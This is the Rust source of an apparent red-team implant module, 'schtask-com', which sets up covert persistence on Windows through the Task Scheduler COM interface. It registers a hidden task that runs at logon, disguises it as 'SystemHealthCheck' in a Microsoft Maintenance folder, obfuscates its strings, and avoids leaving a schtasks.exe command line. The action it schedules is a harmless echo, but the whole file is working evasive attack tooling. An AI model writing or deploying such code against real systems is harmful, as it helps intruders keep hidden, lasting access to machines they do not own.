// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//! schtask-com — Scheduled Task persistence via ITaskService COM.
//! Pure COM RegisterTaskDefinition — no schtasks.exe, no cmdline.
//! MITRE ATT&CK: T1053.005
#![no_std]
#![cfg_attr(not(test), no_main)]

use core::ffi::c_void;
use core::ptr::null_mut;
use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[Technique {
    id: "T1053.005",
    name: "Scheduled Task",
    tactic: "Persistence / Privilege Escalation",
}];

const CLSID_TASKSCHEDULER: [u8; 16] = [
    0x9f, 0x36, 0x87, 0x0f, 0xe5, 0xa4, 0xd1, 0x11,
    0x97, 0x81, 0x00, 0x60, 0x08, 0x24, 0x30, 0x9d,
];
const IID_ITASKSERVICE: [u8; 16] = [
    0xc7, 0xa4, 0xab, 0x2f, 0xa9, 0x4d, 0x13, 0x40,
    0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85,
];

const CLSCTX_INPROC_SERVER: u32 = 1;
const S_OK: i32 = 0;
const TASK_TRIGGER_LOGON: i32 = 9;
const TASK_ACTION_EXEC: i32 = 0;
const TASK_CREATE_OR_UPDATE: i32 = 6;
const TASK_LOGON_INTERACTIVE_TOKEN: i32 = 3;

dfr_fn!(co_create_instance(
    clsid: *const u8, outer: *mut c_void, ctx: u32,
    iid: *const u8, ppv: *mut *mut c_void,
) -> i32, module = "ole32.dll", api = "CoCreateInstance");

dfr_fn!(sys_alloc_string(s: *const u16) -> *mut u16,
    module = "oleaut32.dll", api = "SysAllocString");

dfr_fn!(sys_free_string(bstr: *mut u16) -> (),
    module = "oleaut32.dll", api = "SysFreeString");

#[repr(C)]
#[derive(Clone, Copy)]
struct Variant { vt: u16, r1: u16, r2: u16, r3: u16, val: u64, _pad: u64 }
impl Variant {
    fn empty() -> Self { Self { vt: 0, r1: 0, r2: 0, r3: 0, val: 0, _pad: 0 } }
}

unsafe fn release(ptr: *mut c_void) {
    if ptr.is_null() { return; }
    let vtbl = *(ptr as *mut *mut usize);
    let f: unsafe extern "system" fn(*mut c_void) -> u32 =
        core::mem::transmute(*vtbl.add(2));
    f(ptr);
}

fn to_wide(s: &[u8], buf: &mut [u16]) {
    let mut i = 0;
    for &b in s { if i >= buf.len() - 1 { break; } buf[i] = b as u16; i += 1; }
    buf[i] = 0;
}

unsafe fn alloc_bstr(s: &[u8]) -> Result<*mut u16, &'static str> {
    let mut buf = [0u16; 260];
    to_wide(s, &mut buf);
    sys_alloc_string(buf.as_ptr()).map_err(|_| "bstr alloc")
}

unsafe fn free_bstr(b: *mut u16) {
    if !b.is_null() { let _ = sys_free_string(b); }
}

unsafe fn vtget(obj: *mut c_void, slot: usize) -> Result<*mut c_void, &'static str> {
    let vtbl = *(obj as *mut *mut usize);
    let f: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
        core::mem::transmute(*vtbl.add(slot));
    let mut out: *mut c_void = null_mut();
    if f(obj, &mut out) == S_OK && !out.is_null() { Ok(out) } else { Err("vtget") }
}

unsafe fn vtcreate(obj: *mut c_void, slot: usize, ty: i32) -> Result<*mut c_void, &'static str> {
    let vtbl = *(obj as *mut *mut usize);
    let f: unsafe extern "system" fn(*mut c_void, i32, *mut *mut c_void) -> i32 =
        core::mem::transmute(*vtbl.add(slot));
    let mut out: *mut c_void = null_mut();
    if f(obj, ty, &mut out) == S_OK && !out.is_null() { Ok(out) } else { Err("vtcreate") }
}

unsafe fn vtput16(obj: *mut c_void, slot: usize, val: i16) {
    let vtbl = *(obj as *mut *mut usize);
    let f: unsafe extern "system" fn(*mut c_void, i16) -> i32 =
        core::mem::transmute(*vtbl.add(slot));
    f(obj, val);
}

unsafe fn vtput32(obj: *mut c_void, slot: usize, val: i32) {
    let vtbl = *(obj as *mut *mut usize);
    let f: unsafe extern "system" fn(*mut c_void, i32) -> i32 =
        core::mem::transmute(*vtbl.add(slot));
    f(obj, val);
}

unsafe fn vtputbstr(obj: *mut c_void, slot: usize, val: *mut u16) {
    let vtbl = *(obj as *mut *mut usize);
    let f: unsafe extern "system" fn(*mut c_void, *mut u16) -> i32 =
        core::mem::transmute(*vtbl.add(slot));
    f(obj, val);
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let _com = unsafe { common::com::ComGuard::init_apartment() }
        .map_err(|_| "com init failed")?;

    let mut svc: *mut c_void = null_mut();
    let hr = unsafe {
        co_create_instance(
            CLSID_TASKSCHEDULER.as_ptr(), null_mut(),
            CLSCTX_INPROC_SERVER, IID_ITASKSERVICE.as_ptr(), &mut svc,
        )
    }.map_err(|_| "resolve failed")?;
    if hr != S_OK || svc.is_null() { return Err("create failed"); }

    // Connect (vtbl[3])
    unsafe {
        let vtbl = *(svc as *mut *mut usize);
        let f: unsafe extern "system" fn(
            *mut c_void, Variant, Variant, Variant, Variant
        ) -> i32 = core::mem::transmute(*vtbl.add(3));
        if f(svc, Variant::empty(), Variant::empty(), Variant::empty(), Variant::empty()) != S_OK {
            release(svc); return Err("connect failed");
        }
    }

    obf! { let task_folder = r"\Microsoft\Windows\Maintenance"; }
    obf! { let task_name = "SystemHealthCheck"; }
    obf! { let task_cmd = r"C:\Windows\System32\cmd.exe"; }
    obf! { let task_args = "/c echo ok"; }

    // GetFolder (vtbl[4])
    let folder_bstr = unsafe { alloc_bstr(task_folder.as_bytes())? };
    let folder = unsafe {
        let vtbl = *(svc as *mut *mut usize);
        let f: unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut c_void) -> i32 =
            core::mem::transmute(*vtbl.add(4));
        let mut out: *mut c_void = null_mut();
        let hr = f(svc, folder_bstr, &mut out);
        free_bstr(folder_bstr);
        if hr != S_OK || out.is_null() { release(svc); return Err("get folder"); }
        out
    };

    // NewTask (vtbl[6])
    let def = match unsafe { vtcreate(svc, 6, 0) } {
        Ok(d) => d,
        Err(_) => { unsafe { release(folder); release(svc); } return Err("new task"); }
    };

    // Settings: put_Hidden (vtbl[26])
    if let Ok(s) = unsafe { vtget(def, 7) } {
        unsafe { vtput16(s, 26, -1); release(s); }
    }
    // Principal: put_LogonType (vtbl[14])
    if let Ok(p) = unsafe { vtget(def, 11) } {
        unsafe { vtput32(p, 14, TASK_LOGON_INTERACTIVE_TOKEN); release(p); }
    }
    // Triggers: Create logon (vtbl[10])
    if let Ok(trigs) = unsafe { vtget(def, 5) } {
        if let Ok(t) = unsafe { vtcreate(trigs, 10, TASK_TRIGGER_LOGON) } {
            unsafe { vtput16(t, 19, -1); release(t); }
        }
        unsafe { release(trigs); }
    }
    // Actions: Create exec (vtbl[10])
    if let Ok(acts) = unsafe { vtget(def, 13) } {
        if let Ok(a) = unsafe { vtcreate(acts, 10, TASK_ACTION_EXEC) } {
            let cb = unsafe { alloc_bstr(task_cmd.as_bytes())? };
            let ab = unsafe { alloc_bstr(task_args.as_bytes())? };
            unsafe {
                vtputbstr(a, 11, cb);
                vtputbstr(a, 13, ab);
                free_bstr(cb); free_bstr(ab); release(a);
            }
        }
        unsafe { release(acts); }
    }

    // RegisterTaskDefinition (ITaskFolder vtbl[17])
    let nb = unsafe { alloc_bstr(task_name.as_bytes())? };
    let ok = unsafe {
        let vtbl = *(folder as *mut *mut usize);
        let f: unsafe extern "system" fn(
            *mut c_void, *mut u16, *mut c_void, i32,
            Variant, Variant, i32, Variant, *mut *mut c_void,
        ) -> i32 = core::mem::transmute(*vtbl.add(17));
        let mut reg: *mut c_void = null_mut();
        let hr = f(folder, nb, def, TASK_CREATE_OR_UPDATE,
            Variant::empty(), Variant::empty(),
            TASK_LOGON_INTERACTIVE_TOKEN, Variant::empty(), &mut reg);
        free_bstr(nb); release(def); release(folder); release(svc);
        if hr == S_OK && !reg.is_null() { release(reg); true } else { false }
    };

    if !ok { return Err("register failed"); }
    println!("[+] {}: task registered", obf!("schtask-com"));
    println!("[+] {}", obf!("persistence established via COM"));
    Ok(())
}
